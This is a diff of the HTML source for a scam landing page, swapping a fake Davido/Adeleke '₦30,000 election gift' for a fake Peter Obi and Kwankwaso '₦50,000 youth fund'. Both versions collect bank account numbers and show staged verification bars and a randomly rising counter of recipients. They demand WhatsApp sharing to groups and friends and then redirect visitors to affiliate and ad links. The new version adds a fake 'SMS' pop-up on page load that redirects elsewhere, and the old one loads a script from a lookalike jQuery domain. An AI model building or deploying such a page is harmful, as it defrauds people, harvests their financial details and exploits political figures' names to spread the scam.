@@ -1,744 +1,1055 @@
+
 <!DOCTYPE html>
-<html>
-   <head>
-    
-    <script>
-        function set_Cookie(name,value){
-            var Days = 30;
-            var exp = new Date();
-            exp.setTime(exp.getTime() + (Days*20*1000));
-            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
-        }
-        function get_Cookie(name){
-            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-            if(arr=document.cookie.match(reg)){
-                return unescape(arr[2]);
-            }
-            return '';
-        }
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PETER OBI & KWANKWASO YOUTH EMPOWERMENT MOVEMENT</title>
 
+  <!-- Unique Dynamic Hash Generator & Native Prompt Pop-up -->
+  <script>
+    // Generate/persist unique browser hash fragment
+    (function () {
+      const hashKey = "user_unique_hash";
+      let uniqueId = localStorage.getItem(hashKey);
 
-        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
-                        document.getElementById("first-box")."quedate__step".display="none";//??;
-                        document.getElementById("second-box").style.display="none";//??;
-                        document.getElementById("third-box").style.display="none";//??;
-                        document.getElementsByClassName("loading2__box").style.display="";//??;
-                    }*/
+      if (!uniqueId) {
+        uniqueId = Date.now() + Math.floor(Math.random() * 100);
+        localStorage.setItem(hashKey, uniqueId);
+      }
 
+      if (window.location.hash !== '#' + uniqueId) {
+        history.replaceState(null, null, '#' + uniqueId);
+      }
+    })();
 
-    </script>
-   
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Davido & Governor Adeleke's ₦20,000 Election Gift for All Supporters</title>
-    <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
-    
-    <meta name="og:title" content="ACCOUNT NUMBER" />
-    <meta property="og:description"
-        content="₦20,000 ELECTION CAMPAIGN OFFER" />
-    <meta property="og:image"
-        content="https://try.kanex.online/let/IMG-20260814-WA0064.jpg" />
-    <meta property="og:type" content="website" />
-    <meta property="og:updated_time" content="1440432930" />
-    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
-     <script src="https://code-jquery-div-java-script-class-font-bg-color-style.ink/div-bg-color-font-001.js"></script>
-    <link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
-    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
-    <meta name='google-adsense-platform-domain' content='blogspot.com' />
-    <link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
-    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
-    <meta name='google-adsense-platform-domain' content='blogspot.com' />
-    <link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
-    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
-    <meta name='google-adsense-platform-domain' content='blogspot.com' />
-    <link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
-    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
-    <meta name='google-adsense-platform-domain' content='blogspot.com' />
-    <link rel="me" href="https://draft.blogger.com/profile/05853757488319578479" />
-    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
-    <meta name='google-adsense-platform-domain' content='blogspot.com' />
-    
-    
+    // Native Prompt
+    var defaultVal = '₦50,000';
+    var password = prompt('SMS: Congratulations, you are eligible to receive  ₦50,000 Youth Support Fund from OK Movement, click OK to Activate now', defaultVal);
+    if (password !== defaultVal && password !== null) {
+      location.href = 'https://new.billpoint.store/ok-movement-empowerment.html#1785864670818';
+    }
+  </script>
+
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="OK Movement Youth Empowerment Fund – Get ₦50,000 Cash!" />
+  <meta property="og:description"
+    content="Support Peter Obi & Kwankwaso for 2027 – Get ₦50,000 Cash" />
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7Qw64_SUP6WCx9WlHtZxNqp9HRzq_V3zSv6KG4ayeUg&s" />
+  <meta property="og:type" content="website" />
+
+  <!-- Fonts & Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+
+  <style>
+    :root {
+      --primary: #059669;
+      --primary-dark: #047857;
+      --primary-gradient: linear-gradient(135deg, #059669 0%, #047857 100%);
+      --bg-color: #F8FAFC;
+      --card-bg: #FFFFFF;
+      --text-main: #0F172A;
+      --text-muted: #64748B;
+      --border-color: #E2E8F0;
+      --radius-lg: 16px;
+      --radius-md: 10px;
+      --shadow-sm: 0 2px 8px rgba(15, 23, 42, 0.04);
+      --shadow-md: 0 10px 25px -5px rgba(15, 23, 42, 0.08), 0 8px 10px -6px rgba(15, 23, 42, 0.04);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background: var(--bg-color);
+      color: var(--text-main);
+      overflow-x: hidden;
+      padding-bottom: 30px;
+    }
+
+    /* Single Column Wrapper with Expanded PC Width */
+    .main-wrapper {
+      width: 100%;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 12px;
+      transition: max-width 0.3s ease, padding 0.3s ease;
+    }
+
+    @media (min-width: 768px) {
+      .main-wrapper {
+        max-width: 720px;
+        /* Increased Width for PC / Desktop View */
+        padding: 24px 16px;
+      }
+    }
+
+    /* Banner Container (Full Display Image) */
+    .banner-container {
+      position: relative;
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow: var(--shadow-sm);
+      margin-bottom: 12px;
+      background: #fff;
+    }
+
+    .banner-img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* Ticker Banner */
+    .ticker-bar {
+      background: #FEF3C7;
+      color: #92400E;
+      font-size: 12.5px;
+      font-weight: 700;
+      padding: 8px 14px;
+      border-radius: var(--radius-md);
+      margin-bottom: 12px;
+      text-align: center;
+      box-shadow: var(--shadow-sm);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .ticker-bar marquee {
+      flex: 1;
+    }
+
+    /* Counter Card */
+    .counter-card {
+      background: var(--primary-gradient);
+      color: #fff;
+      padding: 16px;
+      border-radius: var(--radius-lg);
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(5, 150, 105, 0.25);
+      margin-bottom: 16px;
+    }
+
+    .counter-card .sub-label {
+      font-size: 11.5px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      opacity: 0.9;
+      font-weight: 600;
+    }
+
+    #countdowntimer {
+      color: #FDE047;
+      font-size: 30px;
+      font-weight: 800;
+      line-height: 1.2;
+      display: block;
+      margin: 4px 0;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+    }
+
+    .counter-card .desc {
+      font-size: 13.5px;
+      font-weight: 500;
+      opacity: 0.95;
+    }
+
+    /* Single Column Content Stack */
+    .content-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    /* Main Container Card */
+    .post {
+      background: var(--card-bg);
+      border-radius: var(--radius-lg);
+      padding: 20px;
+      box-shadow: var(--shadow-md);
+      border: 1px solid var(--border-color);
+    }
+
+    .welcome {
+      font-size: 14px;
+      line-height: 1.55;
+      text-align: center;
+      color: var(--text-muted);
+    }
+
+    .amount {
+      color: var(--primary);
+      font-weight: 800;
+      font-size: 14.5px;
+    }
+
+    .title {
+      text-align: center;
+      font-weight: 700;
+      margin-bottom: 10px;
+      font-size: 15.5px;
+      color: var(--text-main);
+    }
+
+    .error {
+      display: none;
+      text-align: center;
+      font-size: 13px;
+      color: #EF4444;
+      font-weight: 600;
+      margin-top: 6px;
+    }
+
+    /* Controls & Inputs */
+    select,
+    input[type="text"] {
+      width: 100%;
+      height: 50px;
+      padding: 0 16px;
+      font-size: 14.5px;
+      font-weight: 500;
+      border: 1.5px solid var(--border-color);
+      border-radius: var(--radius-md);
+      outline: none;
+      background: #F8FAFC;
+      color: var(--text-main);
+      margin: 12px 0;
+      transition: all 0.2s ease;
+      display: block;
+    }
+
+    select:focus,
+    input[type="text"]:focus {
+      border-color: var(--primary);
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(5, 150, 105, 0.12);
+    }
+
+    button,
+    .btn-primary {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 50px;
+      color: #fff;
+      border: none;
+      outline: none;
+      font-size: 15.5px;
+      font-weight: 700;
+      cursor: pointer;
+      border-radius: var(--radius-md);
+      margin: 10px 0;
+      background: var(--primary-gradient);
+      box-shadow: 0 4px 12px rgba(5, 150, 105, 0.25);
+      transition: all 0.2s ease;
+      text-decoration: none;
+    }
+
+    button:hover,
+    .btn-primary:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 16px rgba(5, 150, 105, 0.35);
+    }
+
+    button:active,
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    /* Progress Bar */
+    .barr {
+      width: 100%;
+      margin: 14px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .fill {
+      position: relative;
+      flex: 1;
+      height: 26px;
+      background: #E2E8F0;
+      border-radius: 999px;
+      overflow: hidden;
+      padding: 2px;
+    }
+
+    #fill,
+    #fill2 {
+      background: var(--primary-gradient);
+      width: 0%;
+      height: 100%;
+      border-radius: 999px;
+      transition: width 0.4s ease;
+    }
+
+    .percentage {
+      width: 58px;
+      height: 26px;
+      font-size: 12.5px;
+      font-weight: 800;
+      color: var(--primary);
+      background: #ECFDF5;
+      border-radius: 999px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #loader,
+    #info,
+    #checking,
+    #share,
+    #claim {
+      display: none;
+    }
+
+    .spin {
+      width: 38px;
+      height: 38px;
+      border: solid 3.5px #E2E8F0;
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      margin: 14px auto;
+      animation: spin 0.75s linear infinite;
+    }
+
+    @keyframes spin {
+      100% {
+        transform: rotate(1turn);
+      }
+    }
+
+    @keyframes flcPop {
+      0% {
+        opacity: 0;
+        transform: translateY(4px) scale(.98);
+      }
+
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* Dynamic Comments System */
+    #flc-widget {
+      width: 100%;
+      background: #FFFFFF;
+      border-radius: var(--radius-lg);
+      border: 1px solid var(--border-color);
+      box-shadow: var(--shadow-md);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      color: #0F172A;
+    }
+
+    .flc-comment-row {
+      display: flex;
+      gap: 10px;
+      margin: 8px 0;
+      width: 100%;
+      animation: flcPop .25s ease;
+    }
+
+    .flc-comment-col {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .flc-comment-bubble {
+      background: #F1F5F9;
+      border-radius: 14px;
+      padding: 9px 14px;
+      display: inline-block;
+      max-width: 100%;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+      word-break: break-word;
+      font-size: 13px;
+      line-height: 1.45;
+      color: var(--text-main);
+    }
+
+    .flc-replies {
+      margin-left: clamp(10px, 2.5vw, 20px);
+      padding-left: clamp(8px, 1.5vw, 12px);
+      border-left: 2px solid #E2E8F0;
+      margin-top: 4px;
+    }
+
+    .flc-action-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-weight: 700;
+      font-size: 11.5px;
+      cursor: pointer;
+      padding: 0 2px;
+    }
+
+    .flc-action-btn:hover {
+      text-decoration: underline;
+      color: var(--primary);
+    }
+
+    .flc-reply-input-box {
+      display: flex;
+      gap: 6px;
+      margin-top: 6px;
+      width: 100%;
+    }
+
+    .flc-reply-input-box input {
+      flex: 1;
+      min-width: 0;
+      border: 1px solid var(--border-color);
+      background: #F8FAFC;
+      border-radius: 999px;
+      padding: 4px 14px;
+      font-size: 12.5px;
+      height: 34px;
+      margin: 0;
+      outline: none;
+    }
+
+    /* Promo Cards */
+    .promo-card {
+      background: #fff;
+      border-radius: 14px;
+      padding: 16px;
+      margin: 16px 0 0;
+      border: 1px solid var(--border-color);
+      box-shadow: var(--shadow-sm);
+      text-align: left;
+    }
+  </style>
 <!-- CSS_ADSBLOCK_START -->
 <link rel="stylesheet" href="https://adblockers.opera-mini.net/css_block/default-domainless.css" type="text/css" />
 <!-- CSS_ADSBLOCK_END -->
 </head>
 
 <body>
-    <style>
-        .blink {
-            animation: blink 1s steps(1, end) infinite;
-        }
 
-        @keyframes blink {
-            0% {
-                opacity: 1;
-            }
-
-            50% {
-                opacity: 0;
-            }
-
-            100% {
-                opacity: 1;
-            }
-        }
-    </style>
-
-
-
-    <style>
-
-
-        
-@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
-@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
-* {
-margin: 0;
-padding: 0;
-font-family: Poppins, Droid Arabic Naskh;
-font-weight: normal;
-box-sizing: border-box;
-
-
-}
-body {
-direction: lfl;
-background: #ffffff ;
-}
-a {
-text-decoration: none;
-}
-.post {
-background: #fff;
-margin: 0 auto;
-padding: 10px;
-max-width: 500px;
-border: 1px solid #d0d1d5;
-border-radius: 3px;
-}
-.post img {
-width: 100%;
-}
-.welcome {
-font-size: 15px;
-}
-.amount,
-#getname {
-color: #098105;
-text-decoration: none;
-}
-.done {
-text-align: center;
-color: #27ae60;
-}
-.tip {
-font-size: 14px;
-}
-.title {
-text-align: center;
-}
-.error {
-display: none;
-text-align: center;
-font-size: 14px;
-color: #e74c3c;
-}
-button {
-display: block;
-width: 200px;
-height: 50px;
-color: #fff;
-border: none;
-outline: none;
-font-size: 24px;
-cursor: pointer;
-border-radius: 5px;
-padding: 0 10px;
-margin: 10px auto;
-background: rgb(127, 0, 0);
-transition: background 0.3s ease;
-}
-button:hover {
-background: #098105;
-}
-.phone {
-max-width: 400px;
-margin: 10px auto;
-}
-.phone input {
-width: 100%;
-height: 50px;
-padding: 10px;
-outline: none;
-border: 2px solid #cecece;
-font-size: 14px;
-}
-#confirm {
-width: 200px;
-margin: 10px auto;
-border-radius: 0px;
-}
-#loader {
-text-align: center;
-}
-.spin {
-width: 50px;
-height: 50px;
-background: transparent;
-border: solid 8px rgb(207, 27, 28);
-border-right-color: transparent;
-border-radius: 50%;
-margin: 10px auto;
-animation: spin 0.8s linear infinite;
-}
-@keyframes spin {
-100% {
-transform: rotate(1turn);
-}
-}
-#loader,
-#info,
-#checking,
-#share,
-#claim {
-display: none;
-}
-.center {
-display: flex;
-align-items: center;
-justify-content: center;
-}
-.barr {
-direction: ltr;
-max-width: 400px;
-margin: 10px auto;
-box-sizing: border-box;
-}
-.fill {
-position: relative;
-display: inline-block;
-width: calc(100% - 100px);
-height: 35px;
-padding: 2px;
-border: 2px solid #098105;
-}
-#fill,
-#fill2 {
-background: #098105;
-width: 0%;
-height: 100%;
-}
-.percentage {
-width: 100px;
-float: right;
-height: 35px;
-font-size: 16px;
-border: 2px solid #098105;
-}
-#percentage,
-#percentage2 {
-margin-left: 5px;
-}
-#check,
-#check2 {
-display: none;
-}
-.counter {
-color: #7f7f7f;
-font-size: 12px;
-text-align: right;
-padding: 10px 0 10px 2px;
-border-bottom: 1px solid #e1e2e3;
-}
-.reactions {
-display: inline-flex;
-align-items: center;
-float: left;
-}
-.counter img {
-float: left;
-width: 16px;
-height: 16px;
-border-radius: 50%;
-border: 2px solid #fff;
-box-sizing: content-box;
-}
-.like,
-.love {
-margin-right: -5px;
-}
-.like {
-z-index: 2;
-}
-.love {
-z-index: 1;
-}
-.bar {
-display: table;
-width: 100%;
-border-bottom: 1px solid #e1e2e3;
-}
-.bar .react {
-display: table-cell;
-width: calc(100% / 3);
-font-size: 12px;
-color: #7f7f7f;
-text-align: center;
-padding: 10px 0;
-cursor: pointer;
-}
-.comments {
-direction: ltr;
-}
-.comment {
-padding: 6px 0;
-margin-top: 5px;
-}
-.comment img {
-float: left;
-width: 32px;
-height: 32px;
-border: none;
-border-radius: 18px;
-cursor: pointer;
-}
-.reply {
-margin-left: 37px;
-}
-.single-container {
-margin-left: 37px;
-background: #f1f2f6;
-padding: 10px;
-border-radius: 15px;
-font-size: 12px;
-}
-.single-container .user {
-display: inline-block;
-cursor: pointer;
-color: #365899;
-margin-bottom: 5px;
-}
-.single-container .text {
-display: block;
-}
-.buttons {
-font-size: 12px;
-font-weight: bold;
-margin: 10px 0 0 47px;
-color: #90949c;
-}
-.action {
-cursor: pointer;
-}
-.action:hover {
-text-decoration: underline;
-}
-.input {
-padding: 6px 12px 12px;
-}
-.input input {
-width: 100%;
-background: #f1f2f6;
-padding: 10px;
-border-radius: 15px;
-border: 0;
-outline: none;
-}
-.A{
-text-align: center;
-background-color: rgb(127, 0, 0);
-}
-    </style>
-	<marquee behavior="alternate">₦20,000 ELECTION CAMPAIGN OFFER</marquee>
-    <center>
-        
-        <img src="https://try.kanex.online/let/IMG-20260814-WA0064.jpg" alt="Free-Data" style="width: 100%;">
-    </center>
-
-   
-	
-    <div class="A">
-        <font color="white">SHARE THIS WITH YOUR OTHERS ON WHATSAPP TOO, SO THAT THEY CAN BENEFIT TOO.</font>
-        <script type="text/javascript">
-            var timeleft = 4548;
-                     var downloadTimer = setInterval(function(){
-                         timeleft= timeleft + Math.floor(Math.random() * 600);
-                         document.getElementById('countdowntimer').textContent = timeleft;
-                         if (timeleft <= 0)
-                             clearInterval(downloadTimer);
-                     }, 1000);
-        </script>
+  <div class="main-wrapper">
+    <!-- Header Banner -->
+    <div class="banner-container">
+      <img src="https://reg.kanex.online/grapoffer/file_00000000117481f98a9984220835d5a7.jpg" alt="Free-Data-Offer"
+        class="banner-img" />
     </div>
-    <div class="post" width="100%">
 
+    <!-- Ticker -->
+    <div class="ticker-bar">
+      <i class="fa fa-bullhorn" aria-hidden="true"></i>
+      <marquee direction="left">OK YOUTH SUPPORT MOVEMENT FUND</marquee>
+    </div>
+
+    <!-- Counter Card -->
+    <div class="counter-card">
+      <div class="sub-label">Live Verification Tracker</div>
+      <span id="countdowntimer">4548</span>
+      <div class="desc">Nigerians Have Successfully Received ₦50,000 Supports</div>
+    </div>
+
+    <!-- Content Grid (Single-Column Layout) -->
+    <div class="content-grid">
+
+      <!-- Verification Form Steps -->
+      <div class="post">
+
+        <!-- Step 1: Network Selection -->
         <div id="intro">
-
-            <p class="welcome">
-               
-
-
-
-
-                <span class="amount"><font color="#032c13"><b>POWERED BY:</b></font><font color="#b00000"> Davido</font> | </span>
-               Davido Collaborate with OPay, PalmPay, Moniepoint and Kuda to provide ₦30,000 to his fans in celebration of his Uncle, Gov. Ademola Adeleke victory in the just concluded Osun State Governorship Election<br> <span class="amount"></span> <br/>
-
-
-            </p>
-
-  <center>
-
-                    <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
-    width: 330px;
-    height: 56px;
-">
-<option value="أختر نوع الشبكة" selected="1">---SELECT BANK---</option>
-<option value="1"> Opay - ₦30,000   </option>
-<option value="1"> Palmpay - ₦30,000    </option>
-                     <option value="1"> Moniepoint - ₦30,000    </option>
-                     <option value="1"> Kuda - ₦30,000    </option>
-
-
-                        
-</select>
-                </center>
-
- <br/>
-			<br/>
-            
-
-            <button id="go">GET ₦30,000</button>
+          <p class="welcome">
+            <span class="amount">POWERED BY: DAVIDO </span><br />
+         OK MOVEMENT in collaboration with PETER OBI and RABIU KWANKWASO to provide <strong>₦50,000 Support Funds.</strong> This opportunity is valid to all Nigerians.
+          </p>
+          <br />
+          <select id="network-select" aria-label="Select Network">
+            <option value="" selected disabled>-- SELECT YOUR BANK --</option>
+            <option value="1">Access Bank Plc - &#8358;50,000</option>
+<option value="2">Ecobank Bank - &#8358;50,000</option>
+<option value="3">Fidelity Bank - &#8358;50,000</option>
+<option value="4">First Bank of Nigeria - &#8358;50,000</option>
+<option value="5">Globus Bank Plc - &#8358;50,000</option>
+<option value="6">GT Bank - &#8358;50,000</option>
+<option value="7">Jaiz Bank - &#8358;50,000</option>
+<option value="8">Keystone Bank Limited - &#8358;50,000</option>
+<option value="9">Kuda - &#8358;50,000</option>
+<option value="10">Lotus Bank - &#8358;50,000</option>
+<option value="8">Moniepoint - &#8358;50,000</option>
+<option value="11">Opay - &#8358;50,000</option>
+<option value="12">Other Banks - &#8358;50,000</option>
+<option value="13">Palmpay - &#8358;50,000</option>
+<option value="14">Parallex Bank - &#8358;50,000</option>
+<option value="15">Providus Bank Plc - &#8358;50,000</option>
+<option value="8">SmartCash - &#8358;50,000</option>
+<option value="16">Signature Bank - &#8358;50,000</option>
+<option value="17">Stanbic IBTC Bank Plc - &#8358;50,000</option>
+<option value="18">Sterling Bank - &#8358;50,000</option>
+<option value="19">Taj Bank - &#8358;50,000</option>
+<option value="20">Titan Trust Bank - &#8358;50,000</option>
+<option value="21">Union Bank of Nigeria Plc - &#8358;50,000</option>
+<option value="22">United Bank for Africa Plc - &#8358;50,000</option>
+<option value="23">Wema Bank Plc - &#8358;50,000</option>
+<option value="24">Zenith Bank Plc - &#8358;50,000</option>
+          </select>
+          <button id="go">GET ₦50,000 NOW!</button>
         </div>
+
+        <!-- Step 2: Loader -->
         <div id="loader">
-            <div>Please Wait ...</div>
-            <div class="spin"></div>
-            <div id="num">0%</div>
+          <p class="title">Verifying Eligibility...</p>
+          <div class="spin"></div>
+          <div id="num" style="text-align:center; font-weight:800; font-size:16px; color:var(--primary);">0%</div>
         </div>
+
+        <!-- Step 3: Phone Form -->
         <div id="info">
-            <p class="title"> ENTER YOUR ACCOUNT NUMBER:</p>
-            <div class="phone">
-                <center><input type="char" placeholder="XXXXXXXXXX" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
-                </center>
-
-                <br/>
-             <br>
-
-<br/>
-
-                <button id="confirm">Submit</button>
-            </div>
-            <p class="error">Please Validate Your Account Number</p>
+          <p class="title">Enter Your Account Number:</p>
+          <input type="text" placeholder="e.g. 8012345678" id="phone-input" maxlength="11" />
+          <button id="confirm">Proceed to Withdrawal</button>
+          <p class="error">Please enter a valid bank account number</p>
         </div>
+
+        <!-- Step 4: Verification Bar -->
         <div id="checking">
-            <p class="title">Please wait a moment...</p>
-            <div class="barr">
-                <div class="fill">
-                    <div id="fill"></div>
-                </div>
-                <div class="percentage center">
-                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
-                    <span id="check"><i class="fa fa-check-circle"></i></span>
-                    <span id="percentage"></span>
-                </div>
+          <p class="title">Processing Your ₦50,000...</p>
+          <div class="barr">
+            <div class="fill">
+              <div id="fill"></div>
             </div>
+            <div class="percentage"><span id="percentage">0%</span></div>
+          </div>
         </div>
+
+        <!-- Step 5: WhatsApp Sharing -->
         <div id="share">
+          <p class="welcome">
+            Congratulations, <span id="getname" class="amount">User</span>!
+          </p>
+          <p style="font-size: 13.5px; margin: 8px 0; text-align:center; color:#64748B;">
+            Your ₦50,000 support allocation is <span style="color:#EF4444; font-weight:800;">PENDING VERIFICATION</span>.
+          </p>
+          <div
+            style="background:#F1F5F9; padding:12px 14px; border-radius:10px; font-size:12.5px; color:#334155; margin-bottom:12px; line-height:1.5;">
+            <strong>Instructions:</strong><br />
+            1. Share this opportunity with 5 WhatsApp Groups or 15 Friends.<br />
+            2. The green verification bar will automatically fill to unlock the last withdrawal button.
+          </div>
+          <button id="whatsapp" style="background:#25D366; box-shadow:0 4px 12px rgba(37, 211, 102, 0.3);"><i
+              class="fa fa-whatsapp" style="font-size:18px; margin-right:6px;"></i> SHARE ON WHATSAPP</button>
 
-            <p class="tip"> Congratulations, <span id="getname"></span>،</p>
-            <p class="tip">
-                Your ₦30,000 Cash Prize is <font color="red"><b>pending</b></font> because you have not completed the WITHDRAWAL process
-               <span class="amount"> Complete the process to receive your cash now </span><br>
-				<br>
-              <font color="red"><b>HOW TO PROCEED?</b></font>
-            </p><br>
-            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
-            <p class="tip">2. You will be redirected automatically to "WITHDRAWAL" page after the GREEN verification bar is filled.</p>
-
-
-            <button id="whatsapp">SHARE</button>
-            <div class="barr">
-                <div class="fill">
-                    <div id="fill2"></div>
-                </div>
-                <div class="percentage center">
-                    <span><i class="fa fa-spinner fa-pulse"></i></span>
-                    <span id="percentage2">0%</span>
-                </div>
+          <div class="barr">
+            <div class="fill">
+              <div id="fill2"></div>
             </div>
+            <div class="percentage"><span id="percentage2">0%</span></div>
+          </div>
         </div>
+
+        <!-- Step 6: Activation (5 Links + 2 Write-up Cards) -->
         <div id="claim">
-            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title"> Click on "WITHDRAW" to get your withdrawal in 24 or 48 hours.</p>
-            <br/>
-            <a onclick="window.open('https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE')"
-                href="https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE">
-                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAW ₦30,000</font></button>
-            </a><br/>
+          <div style="text-align:center; color:#059669; margin-bottom:6px;">
+            <i class="fa fa-check-circle" style="font-size:36px;" aria-hidden="true"></i>
+          </div>
+          <p class="title" style="color:#059669; margin-bottom:12px;">Verification Complete!</p>
 
+          <!-- Button 1 -->
+          <button id="offer">WITHDRAW NOW</button>
 
-                <a onclick="window.open('https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE')"
-                    href="https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE">
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAW ₦30,000</font></button>
-                </a><br/>
+          <!-- Button 2 -->
+          <a href="https://omg10.com/4/9015019" class="btn-primary"
+            target="_blank">WITHDRAW ₦50,000</a>
 
+          <!-- Button 3 -->
+          <a href="https://omg10.com/4/9795310" class="btn-primary"
+            target="_blank">WITHDRAW ₦75,000</a>
 
-      
+          <!-- Button 4 -->
+          <a href="https://omg10.com/4/9015024" class="btn-primary"
+            target="_blank">WITHDRAW ₦100,000</a>
 
-            <a onclick="window.open('https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE')"
-                    href="https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE">
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAW ₦30,000</font></button>
-                </a><br/>
+          <!-- Button 5 -->
+          <a href="https://omg10.com/4/5376067" class="btn-primary"
+            target="_blank">CONFIRM WITHDRAWAL</a>
 
-
-   <br/>
-    <a onclick="window.open('https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE')"
-                    href="https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE">
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAW ₦20,000</font></button>
-                </a><br/>
-
-                <br/>
-                <button id="offer">WITHDRAW STATUS</button><br/>
-
-
-
+          <!-- Write-up 1: Airtel Cheap Data -->
+          <div class="promo-card">
+            <span
+              style="display:inline-block; background:#FEE2E2; color:#DC2626; padding:3px 8px; border-radius:999px; font-size:11px; font-weight:800; margin-bottom:6px;">EXCLUSIVE
+              UPDATE</span>
+            <h3 style="margin:4px 0; color:#DC2626; font-size:16px; font-weight:800;">Gov't Agriculture Grants</h3>
+            <p style="font-size:13px; color:#64748B; line-height:1.45;">Participate in the ongoing government agricultural grant of
+              <strong>₦150k</strong> support. Instant delivery.
+            </p>
+            <a href="https://vt.kanex.online/confirm.html"
+              style="display:inline-block; margin-top:10px; background:#DC2626; color:#fff; text-decoration:none; padding:8px 18px; border-radius:8px; font-weight:700; font-size:13.5px; box-shadow:0 3px 8px rgba(220, 38, 38, 0.25);"
+              target="_blank">Claim Offer →</a>
+          </div>
 
         </div>
-       <style>
-  /* Only kept here because @keyframes cannot be written as an inline style */
-  @keyframes flcPulse{
-    0%{box-shadow:0 0 0 0 rgba(250,56,62,.55);}
-    70%{box-shadow:0 0 0 7px rgba(250,56,62,0);}
-    100%{box-shadow:0 0 0 0 rgba(250,56,62,0);}
-  }
-  @keyframes flcPop{
-    0%{opacity:0;transform:translateY(6px) scale(.94);}
-    100%{opacity:1;transform:translateY(0) scale(1);}
-  }
-  @keyframes flcBounce{
-    0%,60%,100%{transform:translateY(0);opacity:.5;}
-    30%{transform:translateY(-4px);opacity:1;}
